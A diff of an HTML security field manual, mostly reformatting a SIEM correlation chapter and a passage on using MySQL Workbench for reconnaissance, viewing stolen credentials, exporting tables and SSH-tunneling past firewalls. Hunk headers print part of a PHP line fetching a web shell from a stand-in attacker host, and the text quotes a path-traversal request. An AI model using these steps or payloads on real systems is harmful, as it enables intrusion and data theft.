@@ -2693,22 +2693,28 @@ Confidentiality Notice: This email contains sensitive security findings.
                 Marliz Intel Field Manual</p>
         </div>
     </div>
-        <div class="page">
+    <div class="page">
         <div class="drop-cap">
             <h1>Chapter 6.2: SIEM - The Art of Correlation</h1>
             <hr />
             <h2>The Brain of the SOC</h2>
-            <p>A SIEM (Security Information and Event Management) system is often treated as a compliance dump—a place where logs go to die. This is a waste of a million-dollar tool.</p>
-            <p>The SIEM is the brain of your security operation. It remembers everything. But like any brain, it is useless if you don't teach it <em>how to think</em>.</p>
-            <p>This chapter assumes you have the logs. Now we will teach you <strong>Detection Engineering</strong>: the art of turning raw data into actionable intelligence.</p>
+            <p>A SIEM (Security Information and Event Management) system is often treated as a compliance dump - a place
+                where logs go to die. This is a waste of a million-dollar tool.</p>
+            <p>The SIEM is the brain of your security operation. It remembers everything. But like any brain, it is
+                useless if you don't teach it <em>how to think</em>.</p>
+            <p>This chapter assumes you have the logs. Now we will teach you <strong>Detection Engineering</strong>: the
+                art of turning raw data into actionable intelligence.</p>
             <h2>The Problem: "Log Fatigue"</h2>
             <p>A single domain controller generates 50,000 logs an hour. A firewall generates millions.</p>
-            <p>If your strategy is "Alert me on every failed login," you will fail. You will receive 5,000 emails a day, ignore them all, and miss the real breach. This is <strong>Alert Fatigue</strong>.</p>
+            <p>If your strategy is "Alert me on every failed login," you will fail. You will receive 5,000 emails a day,
+                ignore them all, and miss the real breach. This is <strong>Alert Fatigue</strong>.</p>
             <p><strong>The Solution:</strong> We do not alert on <em>events</em>. We alert on <em>patterns</em>.</p>
             <h2>The Formula for Correlation</h2>
             <p>Correlation is the logic of combining multiple weak signals to create one high-fidelity alert.</p>
             <p><strong>Logic:</strong><br>
-            <code>Condition A</code> + <code>Condition B</code> + <code>Time constraints</code> = <strong>Incident</strong></p>
+                <code>Condition A</code> + <code>Condition B</code> + <code>Time constraints</code> =
+                <strong>Incident</strong>
+            </p>
             <h3>Tier 1: The "Noise" (Do Not Alert)</h3>
             <ul>
                 <li><strong>Event:</strong> <code>EventID 4625</code> (Failed Login).</li>
@@ -2729,41 +2735,59 @@ Confidentiality Notice: This email contains sensitive security findings.
                 <li><strong>Action:</strong> Low severity ticket.</li>
             </ul>
             <h3>Tier 3: The "Impossible Travel" (High Fidelity)</h3>
-            <p>This is where you start nodding your head. This rule catches compromised credentials even when the password is correct.</p>
+            <p>This is where you start nodding your head. This rule catches compromised credentials even when the
+                password is correct.</p>
             <ul>
                 <li><strong>Logic:</strong>
                     <ul>
-                        <li><code>Event A</code>: Successful Login (<code>User: jdoe</code>) from <code>IP: 1.2.3.4 (New York)</code> at <code>10:00 AM</code>.</li>
-                        <li><code>Event B</code>: Successful Login (<code>User: jdoe</code>) from <code>IP: 5.6.7.8 (London)</code> at <code>11:00 AM</code>.</li>
+                        <li><code>Event A</code>: Successful Login (<code>User: jdoe</code>) from
+                            <code>IP: 1.2.3.4 (New York)</code> at <code>10:00 AM</code>.
+                        </li>
+                        <li><code>Event B</code>: Successful Login (<code>User: jdoe</code>) from
+                            <code>IP: 5.6.7.8 (London)</code> at <code>11:00 AM</code>.
+                        </li>
                         <li><code>Constraint</code>: Time difference &lt; 6 hours (Flight time).</li>
                     </ul>
                 </li>
-                <li><strong>Verdict:</strong> Physics violation. <code>jdoe</code> did not fly supersonic. His credentials are stolen and being used by two people.</li>
+                <li><strong>Verdict:</strong> Physics violation. <code>jdoe</code> did not fly supersonic. His
+                    credentials are stolen and being used by two people.</li>
                 <li><strong>Action:</strong> <strong>Critical Alert.</strong> Isolate account immediately.</li>
             </ul>
             <h3>Tier 4: The "Low & Slow" Exfiltration (The Marliz Standard)</h3>
-            <p>Advanced attackers don't smash windows; they sneak. They use "Low and Slow" techniques to stay under the radar. Here is how we catch them.</p>
+            <p>Advanced attackers don't smash windows; they sneak. They use "Low and Slow" techniques to stay under the
+                radar. Here is how we catch them.</p>
             <ul>
-                <li><strong>The Scenario:</strong> An attacker is stealing your database, but in small chunks to avoid spiking the bandwidth graph.</li>
+                <li><strong>The Scenario:</strong> An attacker is stealing your database, but in small chunks to avoid
+                    spiking the bandwidth graph.</li>
                 <li><strong>The Query Logic:</strong>
                     <ol>
                         <li><strong>Select</strong>: Firewall Allow Logs.</li>
-                        <li><strong>Filter</strong>: <code>Direction = Outbound</code> AND <code>Destination_Port != 80/443</code>.</li>
-                        <li><strong>Aggregation</strong>: Sum(<code>Bytes_Sent</code>) per <code>Source_IP</code> &gt; 500MB over <code>24 hours</code>.</li>
-                        <li><strong>Enrichment</strong>: <code>Destination_IP</code> is NOT in <code>Known_Business_Partners</code>.</li>
-                        <li><strong>Context</strong>: Occurs between <code>02:00</code> and <code>05:00</code> (User's local time).</li>
+                        <li><strong>Filter</strong>: <code>Direction = Outbound</code> AND
+                            <code>Destination_Port != 80/443</code>.
+                        </li>
+                        <li><strong>Aggregation</strong>: Sum(<code>Bytes_Sent</code>) per <code>Source_IP</code> &gt;
+                            500MB over <code>24 hours</code>.</li>
+                        <li><strong>Enrichment</strong>: <code>Destination_IP</code> is NOT in
+                            <code>Known_Business_Partners</code>.
+                        </li>
+                        <li><strong>Context</strong>: Occurs between <code>02:00</code> and <code>05:00</code> (User's
+                            local time).</li>
                     </ol>
                 </li>
-                <li><strong>Verdict:</strong> Why is a laptop sending 500MB of data to an unknown IP in Russia at 3 AM on a non-web port?</li>
+                <li><strong>Verdict:</strong> Why is a laptop sending 500MB of data to an unknown IP in Russia at 3 AM
+                    on a non-web port?</li>
                 <li><strong>Action:</strong> Wake up the CISO.</li>
             </ul>
             <h2>The "Trap" Integration</h2>
             <p>Recall <strong>Chapter 3.6</strong>. We discussed setting a trap for Path Traversal.</p>
-            <p>Real detection engineering connects the <strong>App</strong> to the <strong>Firewall</strong> via the <strong>SIEM</strong>.</p>
+            <p>Real detection engineering connects the <strong>App</strong> to the <strong>Firewall</strong> via the
+                <strong>SIEM</strong>.
+            </p>
             <ol>
                 <li><strong>Trigger:</strong> Web Server logs <code>GET /../../etc/passwd</code>.</li>
                 <li><strong>SIEM Rule:</strong> <code>IF URI contains "../" THEN Trigger "Web Attack"</code>.</li>
-                <li><strong>SOAR Response:</strong> <code>Update Firewall Group -&gt; Block Source_IP for 24h</code>.</li>
+                <li><strong>SOAR Response:</strong> <code>Update Firewall Group -&gt; Block Source_IP for 24h</code>.
+                </li>
             </ol>
             <p>The analyst doesn't even need to wake up. The system defended itself.</p>
             <hr />
@@ -2893,7 +2917,8 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
             <hr />
             <h2>Not Just for DBAs</h2>
             <p>We have discussed using MySQL Workbench for exploitation (Chapter 2.5), but it is also a powerful
-                <strong>Reconnaissance</strong> tool.</p>
+                <strong>Reconnaissance</strong> tool.
+            </p>
             <h2>The Connection Test</h2>
             <p>When you are scanning a range of IPs (e.g., a subnet belonging to a company), you can use Workbench to
                 test for open doors without needing complex command-line scanners.</p>
@@ -2913,13 +2938,15 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
             <p>This is valuable information leakage.</p>
             <h2>Visualizing the Loot</h2>
             <p>If you manage to steal credentials (e.g., from a <code>config.php</code> file), using the command line
-                <code>mysql -u root -p</code> is tedious and hard to read.</p>
+                <code>mysql -u root -p</code> is tedious and hard to read.
+            </p>
             <p>Workbench allows you to:
                 1. <strong>Reverse Engineer</strong>: Click "Database" -&gt; "Reverse Engineer" to generate a full
                 <strong>Entity Relationship Diagram (ERD)</strong>. You can see how the tables link, helping you find
                 the "Crown Jewels" (User tables, Transaction tables) instantly.
                 2. <strong>Export Data</strong>: Right-click a table -&gt; "Export Table Data" -&gt; CSV. This is how
-                you generate Proof of Concept (PoC) artifacts for your report efficiently.</p>
+                you generate Proof of Concept (PoC) artifacts for your report efficiently.
+            </p>
             <h2>The Tunnel (Bypassing Firewalls)</h2>
             <p>Workbench has built-in SSH Tunneling, which is a common hacker technique made easy.</p>
             <p><strong>Scenario:</strong> The database port (3306) is blocked by a firewall, but SSH (22) is open. You
@@ -2954,7 +2981,7 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
                 <div class="quote-text">
                     "This is not a textbook.<br>This is a war journal."
                 </div>
-                <div class="quote-author">— FROM THE INTRODUCTION</div>
+                <div class="quote-author"> - FROM THE INTRODUCTION</div>
             </div>
 
             <div class="divider"></div>
@@ -3002,9 +3029,9 @@ file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.t
 
                 <div class="qr-box">
                     <div class="qr-placeholder">
-                        QR<br>CODE
+                        Marliz<br>Intel<br>
                     </div>
-                    <div class="qr-label">SCAN TO VISIT</div>
+                    <div class="qr-label">Intel Bureau</div>
                 </div>
             </div>
         </div>
